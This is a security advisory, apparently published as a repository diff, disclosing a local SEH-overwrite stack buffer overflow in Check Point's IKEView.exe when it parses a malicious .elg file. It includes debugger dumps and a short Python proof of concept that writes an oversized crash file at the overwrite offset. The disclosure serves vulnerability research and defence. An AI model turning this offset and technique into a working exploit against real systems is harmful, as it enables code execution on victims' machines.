@@ -1,0 +1,143 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-CP_IKEVIEW-0911.txt
+
+
+
+Vendor:
+================================
+www.checkpoint.com
+
+
+
+Product:
+================================
+IKEView.exe Fox beta 1
+
+IKEVIew.EXE is used to inspect - internet private key exchanges on the Firewall
+phase(1 & 2) packets being exchanged with switches and gateways.
+
+
+
+Vulnerability Type:
+======================
+Stack Buffer Overflow
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+IKEView.exe is vulnerable to local stack based buffer overflow when parsing
+an malicious (internet key exchange) ".elg" file.
+Vulnerability causes nSEH & SEH pointer overwrites at 4448 bytes after
+IKEView parses our malicious file, which may result then
+result in arbitrary attacker supplied code execution.
+
+
+quick GDB register dump:
+------------------------
+
+EAX 00000000
+ECX 41414141
+EDX 7774B4AD ntdll.7774B4AD
+EBX 00000000
+ESP 0018E0E0
+EBP 0018E100
+ESI 00000000
+EDI 00000000
+EIP 41414141
+C 0 ES 002B 32bit 0(FFFFFFFF)
+P 1 CS 0023 32bit 0(FFFFFFFF)
+A 0 SS 002B 32bit 0(FFFFFFFF)
+Z 1 DS 002B 32bit 0(FFFFFFFF)
+S 0 FS 0053 32bit 7EFDD000(FFF)
+T 0 GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0 LastErr ERROR_SUCCESS (00000000)
+
+-----------SEH Chain---------
+
+0:000> !exchain
+0018f870: 42424242
+Invalid exception stack at 41414141
+0:000>
+0018f870: 42424242
+Invalid exception stack at 41414141
+0:000>
+
+0018F868 |02004AE0 àJ. ASCII "File loaded in 08 minutes, 01 seconds."
+0018F86C |41414141 AAAA
+0018F870 |41414141 AAAA Pointer to next SEH record
+0018F874 |42424242 BBBB SE handler
+
+
+Quick Buffer Overflow POC :
+===========================
+
+
+1) Below python file to create POC save as .py it will generate POC file,
+open in IKEView.exe and KABOOOOOOOOOOOOOOOOOOOOM!
+
+seh="B"*4 #<----------will overwrite SEH with bunch of 42's HEX for 'B'
+ASCII char.
+
+file="C:\\IKEView-buffer-overflow.elg"
+x=open(file,"w")
+payload="A"*4444+seh
+x.write(payload)
+x.close()
+
+print "\n=======================================\n"
+print " IKEView-buffer-overflow.elg file created\n"
+print " hyp3rlinx ..."
+print "=========================================\n"
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Vulnerable Product: [+] IKEView.exe Fox beta 1
+
+
+Vulnerable File Type: [+] .elg
+
+
+Affected Area(s): [+] Local OS
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
